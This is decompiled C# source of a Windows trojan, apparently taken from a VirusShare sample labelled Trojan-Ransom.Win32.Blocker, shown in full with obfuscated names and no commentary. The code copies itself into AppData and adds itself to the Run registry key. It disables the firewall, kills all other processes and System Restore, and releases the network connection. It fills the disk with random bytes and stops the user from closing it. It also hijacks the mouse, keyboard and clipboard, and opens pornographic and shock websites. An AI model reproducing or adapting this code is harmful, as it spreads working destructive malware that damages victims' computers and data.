// Decompiled with JetBrains decompiler
// Type: vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV
// Assembly: Parlize, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9C3AEAA1-D686-49F0-BA49-2C8D7133E38E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bnnn-34807df8ad765ba8bd53ac7d7f2c5d479fd955e3fc0f37bc0d5faf1768dc9722.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace vifc5jEr5oNDtDKYKQb3DrNl6v
{
  public class vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV : Form
  {
    private string vifc5jEr5oNDtDKYKQb3D;
    private string[] vifc5jEr5oNDtDKYKQb3DrNl6vflwh;
    private Point vifc5jEr5oNDtDKY;
    private IContainer vifc5jEr5oNDtDK;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh;
    private System.Windows.Forms.Timer vifc5jEr5oN;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrN;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQ;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vf;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu;
    private System.Windows.Forms.Timer vifc5jEr5oN;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQb3DrNl6vflwh;
    private System.Windows.Forms.Timer vifc5jEr5oNDtDKYKQ;

    [DllImport("user32.dll")]
    private static extern int SwapMouseButton(int bSwap);

    private static void SwapMouse(int value)
    {
      try
      {
        vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.SwapMouseButton(value);
      }
      catch
      {
      }
    }

    [DllImport("user32.dll")]
    private static extern int FindWindow(string className, string windowText);

    [DllImport("user32.dll")]
    private static extern int ShowWindow(int hwnd, int command);

    private static void TaskBar(int value)
    {
      try
      {
        vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.ShowWindow(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.FindWindow("Shell_TrayWnd", ""), value);
      }
      catch
      {
      }
    }

    private static void OnExecution()
    {
      try
      {
        Process currentProcess = Process.GetCurrentProcess();
        foreach (Process process in Process.GetProcesses())
        {
          if (process.Id != currentProcess.Id)
          {
            try
            {
              process.Kill();
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }

    private static void PlaySong()
    {
      while (true)
      {
        Console.Beep(440, 500);
        Console.Beep(440, 500);
        Console.Beep(440, 500);
        Console.Beep(349, 350);
        Console.Beep(523, 150);
        Console.Beep(440, 500);
        Console.Beep(349, 350);
        Console.Beep(523, 150);
        Console.Beep(440, 1000);
        Console.Beep(659, 500);
        Console.Beep(659, 500);
        Console.Beep(659, 500);
        Console.Beep(698, 350);
        Console.Beep(523, 150);
        Console.Beep(415, 500);
        Console.Beep(349, 350);
        Console.Beep(523, 150);
        Console.Beep(440, 1000);
      }
    }

    public vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV()
    {
      this.Xaet7NBtzLxfe2Ks9();
      this.vifc5jEr5oNDtDKYKQb3D = "nguid";
      this.vifc5jEr5oNDtDK(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      Thread.Sleep(1000);
    }

    private void vifc5jEr5oNDtDK(string vifc5jEr5oNDtDKYKQb3DrNl6vfl)
    {
      try
      {
        if (Application.StartupPath == vifc5jEr5oNDtDKYKQb3DrNl6vfl)
          return;
        File.Copy(Application.ExecutablePath, vifc5jEr5oNDtDKYKQb3DrNl6vfl + "\\" + this.vifc5jEr5oNDtDKYKQb3D + ".exe");
        Process.Start(vifc5jEr5oNDtDKYKQb3DrNl6vfl + "\\" + this.vifc5jEr5oNDtDKYKQb3D + ".exe");
        Process.GetCurrentProcess().Kill();
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNhlal4n(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3n,
      EventArgs Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8T)
    {
      for (int index = 0; index < 3; ++index)
        this.Hide();
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh.Stop();
    }

    private void Xaet7NBtzLxfe2(object Xaet7NBtzLxfe2K, EventArgs Xaet7NBtzLxfe2Ks9f) => this.Xaet7NBtzLxfe2Ks9fJNhl();

    private void Xaet7NBtzLxfe2Ks9fJNhl()
    {
      try
      {
        this.vifc5jEr5oNDtDKYKQb3D = "nguid";
        this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh = "rstrui".Split('.');
        if (this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh[0] != "")
          this.vifc5jEr5oNDtDKYKQb3DrN.Enabled = true;
        this.vifc5jEr5oN.Enabled = true;
        new Thread(new ThreadStart(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.Calculus)).Start();
        new Thread(new ThreadStart(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.WriteFile)).Start();
      }
      catch
      {
      }
    }

    private static void WriteFile()
    {
      try
      {
        using (FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmpus.tmp", FileMode.Append))
        {
          Random random = new Random();
          byte[] buffer = new byte[1];
          while (true)
          {
            random.NextBytes(buffer);
            fileStream.WriteByte(buffer[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNh()
    {
      while (true)
      {
        Thread.Sleep(130);
        Cursor.Position = this.vifc5jEr5oNDtDKY;
      }
    }

    private static void Calculus()
    {
      int num = 0;
      while (true)
      {
        if (num == 200)
          num = 0;
        ++num;
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySX(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS1W7,
      EventArgs Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TN)
    {
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in Process.GetProcesses())
      {
        foreach (string str in this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh)
        {
          if (process.ProcessName.ToLower().Contains(str))
          {
            if (process.Id != currentProcess.Id)
            {
              try
              {
                process.Kill();
              }
              catch
              {
              }
            }
          }
        }
      }
    }

    private static void frmForm_FormClosing(object sender, FormClosingEventArgs e)
    {
      try
      {
        e.Cancel = true;
      }
      catch
      {
      }
    }

    private static void tmrFirewall_Tick(object sender, EventArgs e)
    {
      try
      {
        new Process()
        {
          StartInfo = {
            FileName = "netsh.exe",
            Arguments = "firewall set opmode disable",
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJ(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS,
      EventArgs Xaet7NBtzLxfe2Ks9f)
    {
      this.vifc5jEr5oNDtDKYKQ.Interval = new Random().Next(1000, 10000);
      new Thread(new ThreadStart(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.BeepThread)).Start();
    }

    private static void BeepThread() => Console.Beep();

    private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TN(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwq,
      EventArgs Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS1W7N)
    {
      try
      {
        Random random = new Random();
        this.vifc5jEr5oNDtDKYKQb3DrNl6vf.Interval = random.Next(4000, 120001);
        switch (random.Next(0, 5))
        {
          case 0:
            Process.Start("explorer.exe");
            break;
          case 1:
            Process.Start("notepad.exe");
            break;
          case 2:
            Process.Start("mspaint.exe");
            break;
          case 3:
            Process.Start("write.exe");
            break;
          case 4:
            Process.Start("utilman.exe");
            break;
        }
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNhl(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nr,
      EventArgs Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNyS)
    {
      try
      {
        this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU.Interval = new Random().Next(1000, 120000);
        Process currentProcess = Process.GetCurrentProcess();
        foreach (Process process in Process.GetProcesses())
        {
          if (process.Id != currentProcess.Id)
          {
            try
            {
              process.Kill();
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ(object Xaet7NBtzLxfe2Ks9f, EventArgs Xaet7NBtzLxfe)
    {
      try
      {
        Random random = new Random();
        int num = random.Next(0, 8);
        this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.Interval = random.Next(5000, 120001);
        switch (num)
        {
          case 0:
            Process.Start("http://www.octopusgirl.com");
            break;
          case 1:
            Process.Start("http://www.loltrain.com");
            break;
          case 2:
            Process.Start("http://www.youporn.com");
            break;
          case 3:
            Process.Start("http://trololololololololololo.com/");
            break;
          case 4:
            Process.Start("http://www.fuckme.com");
            break;
          case 5:
            Process.Start("http://maytheforcebewithyou.com");
            break;
          case 6:
            Process.Start("http://meatspin.com");
            break;
          case 7:
            Process.Start("http://www.youporngay.com");
            break;
        }
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNhla(
      object Xaet7NBtzL,
      EventArgs Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS1W)
    {
      Point point = new Point();
      Random random = new Random();
      int num1 = random.Next(2);
      int num2 = random.Next(2);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD.Interval = random.Next(1000, 60000);
      point.X = num1 != 1 ? Control.MousePosition.X - random.Next(1, 300) : Control.MousePosition.X + random.Next(1, 300);
      point.Y = num2 != 1 ? Control.MousePosition.Y - random.Next(1, 300) : Control.MousePosition.Y + random.Next(1, 300);
      Cursor.Position = point;
    }

    private static void GenerateString()
    {
      try
      {
        Random random = new Random((int) DateTime.Now.Ticks);
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < random.Next(1, 31); ++index)
        {
          char ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
          stringBuilder.Append(ch);
        }
        SendKeys.Send(stringBuilder.ToString());
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3n,
      EventArgs Xaet7NBtzLxfe2Ks9fJNh)
    {
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.Interval = new Random().Next(5000, 120000);
      vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.GenerateString();
    }

    private void Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS(
      object Xaet7NBtzLxfe2Ks9fJN,
      EventArgs Xaet7NBtzLxfe2Ks)
    {
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk.Interval = new Random().Next(5000, 60000);
      new Thread(new ThreadStart(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.OpenTray)).Start();
    }

    [DllImport("winmm.dll")]
    private static extern void mciSendStringA(
      string lpstrCommand,
      string lpstrReturnString,
      long uReturnLength,
      long hwndCallback);

    private static void OpenTray()
    {
      try
      {
        vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.mciSendStringA("set CDAudio door open", "", (long) sbyte.MaxValue, 0L);
      }
      catch
      {
      }
    }

    private void Xaet7NBtzLxfe2Ks9(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nk,
      EventArgs Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwq)
    {
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.Interval = new Random().Next(1000, 120000);
      vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.ShowMsg();
    }

    private void Xaet7NBtzLxfe2(
      object Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqY,
      EventArgs Xaet7NBtzLxfe2Ks9fJN)
    {
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.vifc5jEr5oNDtDKYKQb3D, (object) Application.ExecutablePath);
      }
      catch
      {
      }
    }

    private static void tmrDisconnect_Tick(object sender, EventArgs e)
    {
      try
      {
        new Process()
        {
          StartInfo = {
            FileName = "ipconfig.exe",
            Arguments = "/release",
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
    }

    private static void tmrClipBoard_Tick(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText(".");
      }
      catch
      {
      }
    }

    private static void ShowMsg()
    {
      Form owner = new Form();
      owner.Size = new Size(1, 1);
      owner.StartPosition = FormStartPosition.Manual;
      Rectangle virtualScreen = SystemInformation.VirtualScreen;
      owner.Location = new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10);
      owner.Show();
      owner.Focus();
      owner.BringToFront();
      owner.TopMost = true;
      int num = (int) MessageBox.Show((IWin32Window) owner, ".", string.Empty, MessageBoxButtons.OK);
      owner.Dispose();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.vifc5jEr5oNDtDK != null)
        this.vifc5jEr5oNDtDK.Dispose();
      base.Dispose(disposing);
    }

    private void Xaet7NBtzLxfe2Ks9()
    {
      this.vifc5jEr5oNDtDK = (IContainer) new Container();
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oN = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrN = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQ = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vf = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oN = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.vifc5jEr5oNDtDKYKQ = new System.Windows.Forms.Timer(this.vifc5jEr5oNDtDK);
      this.SuspendLayout();
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh.Enabled = true;
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVh.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhlal4n);
      this.vifc5jEr5oN.Interval = 5000;
      this.vifc5jEr5oN.Tick += new EventHandler(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.tmrFirewall_Tick);
      this.vifc5jEr5oNDtDKYKQb3DrN.Interval = 500;
      this.vifc5jEr5oNDtDKYKQb3DrN.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySX);
      this.vifc5jEr5oNDtDKYKQ.Interval = 1000;
      this.vifc5jEr5oNDtDKYKQ.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJ);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vf.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TN);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDU.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhl);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhlal4nrJ);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuD.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhla);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhlal4nrJ);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxVhYZIk.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9fJNhlal4nrJ3nkfw8TNySXhDwqYS);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.Interval = 1000;
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYu.Tick += new EventHandler(this.Xaet7NBtzLxfe2Ks9);
      this.vifc5jEr5oN.Interval = 1000;
      this.vifc5jEr5oN.Tick += new EventHandler(this.Xaet7NBtzLxfe2);
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh.Interval = 5000;
      this.vifc5jEr5oNDtDKYKQb3DrNl6vflwh.Tick += new EventHandler(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.tmrDisconnect_Tick);
      this.vifc5jEr5oNDtDKYKQ.Interval = 1000;
      this.vifc5jEr5oNDtDKYKQ.Tick += new EventHandler(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.tmrClipBoard_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(32, 28);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = "FrmMain";
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.TransparencyKey = SystemColors.Control;
      this.WindowState = FormWindowState.Minimized;
      this.FormClosing += new FormClosingEventHandler(vifc5jEr5oNDtDKYKQb3DrNl6v.vifc5jEr5oNDtDKYKQb3DrNl6vflwhXYuDUVZfxV.frmForm_FormClosing);
      this.Load += new EventHandler(this.Xaet7NBtzLxfe2);
      this.ResumeLayout(false);
    }
  }
}
